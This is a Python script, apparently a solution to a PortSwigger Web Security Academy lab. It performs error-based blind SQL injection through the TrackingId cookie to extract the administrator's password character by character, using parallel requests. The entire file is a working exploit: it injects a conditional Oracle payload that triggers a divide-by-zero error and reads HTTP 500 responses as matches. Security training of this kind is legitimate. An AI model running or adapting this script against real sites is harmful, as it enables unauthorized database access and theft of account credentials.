import requests
import concurrent.futures

password = ""
alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
url = "https://0a95002503da94b4805803f5007600f7.web-security-academy.net/filter?category=Accessories"
max_workers = 10  # Number of parallel threads

def check_char(position, char):
    payload = (
        f"TrackingId=tfPEi4822ldibs7h' || (SELECT CASE WHEN "
        f"(1=1) THEN TO_CHAR(1/0) ELSE '' END FROM USERS WHERE username = 'administrator' "
        f"AND SUBSTR(password, {position}, 1) ='{char}') || ';session=s3DD0gJqQAysl28BqBVsVmQbf3T6OGOi"
    )
    headers = {"Cookie": payload}
    req = requests.get(url=url, headers=headers)
    return req.status_code == 500, char

def sql_injection():
    global password
    while len(password) < 20:
        position = len(password) + 1
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(check_char, position, char): char for char in alphabet}
            for future in concurrent.futures.as_completed(futures):
                is_correct, char = future.result()
                if is_correct:
                    print(char)
                    password += char
                    break  # Move to the next character position once a match is found
        print(password)

sql_injection()
